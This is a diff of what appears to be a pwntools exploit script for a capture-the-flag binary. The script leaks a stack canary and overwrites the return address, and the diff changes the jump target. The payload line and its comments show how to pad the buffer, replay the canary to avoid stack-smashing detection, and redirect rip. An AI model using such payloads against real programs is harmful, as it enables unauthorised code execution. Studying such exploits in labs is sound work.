@@ -30,7 +30,7 @@ for i in range (maxAdress,minAdress , -0x4):
 
         maybeCanary = io.recvuntil(b'. ').decode().split('.')[0]
         canary = p64(int(maybeCanary, 16))
-        io.sendline(cyclic(32) + p64(i) + canary + cyclic(8) + p64(0x4011f7))
+        io.sendline(cyclic(32) + p64(i) + canary + cyclic(8) + p64(0x4011db))
         # Send 32 bytes so fill buffer, then the adress of the canary to fill linepointer
         # Then send the canary value to not be detected of stack smashing
         # Padding of 8 to skip rbp and override rip
